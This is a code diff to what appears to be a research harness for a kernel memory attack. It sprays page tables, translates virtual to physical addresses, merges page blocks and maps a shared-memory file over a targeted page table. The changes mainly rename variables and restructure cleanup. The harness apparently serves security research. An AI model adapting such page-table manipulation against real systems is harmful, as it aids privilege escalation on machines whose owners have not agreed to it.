@@ -18,6 +18,12 @@ int pt_spray_bait_allocator(void* ctx) {
     return pt_spray_tables(*static_cast<pt_spray_args_t*>(ctx));
 }
 
+struct pt_install_ctxt {
+    int fd;
+    void *fd_ptr;
+    void *pt_mapped;
+};
+
 int main() {
     rubench_open();
 
@@ -35,11 +41,11 @@ int main() {
 
         int fd_shm = open("/dev/shm", O_TMPFILE | O_RDWR, S_IRUSR | S_IWUSR);
         write(fd_shm, buf, 8);
-        void* file_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+        void* fd_ptr = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
                               MAP_SHARED | MAP_POPULATE, fd_shm, 0);
-        mlock(file_ptr, PAGE_SIZE);
+        mlock(fd_ptr, PAGE_SIZE);
 
-        unsigned long file_phys = rubench_va_to_pa(file_ptr);
+        unsigned long file_phys = rubench_va_to_pa(fd_ptr);
         unsigned long target_phys = rubench_va_to_pa(target);
 
         void* bait_ptr = (void*)((unsigned long)pageblock + PAGEBLOCK_SIZE / 2);
@@ -57,7 +63,7 @@ int main() {
         munlock(target, PAGE_SIZE);
         block_merge(target, 0);
         // Install the page table at the target.
-        mmap(spray_args.start + PAGEBLOCK_SIZE, PAGE_SIZE,
+        auto pt_mapped = mmap(spray_args.start + PAGEBLOCK_SIZE, PAGE_SIZE,
              PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_POPULATE,
              fd_shm,
              0);
@@ -75,12 +81,11 @@ int main() {
             printf("FAIL\n");
         }
 
-        munmap((void*)SPRAY_START, PAGE_SIZE);
-        munmap((void*)(SPRAY_START + PAGEBLOCK_SIZE), PAGE_SIZE);
-        munlock(file_ptr, PAGE_SIZE);
-        munmap(file_ptr, PAGE_SIZE);
         close(fd_shm);
-        munlock((void*)(unsigned long)target, PAGE_SIZE);
+        munlock(fd_ptr, PAGE_SIZE);
+        munmap(fd_ptr, PAGE_SIZE);
+        munmap(pt_mapped, PAGE_SIZE);
+
         munmap(pageblock, PAGEBLOCK_SIZE);
     }
 
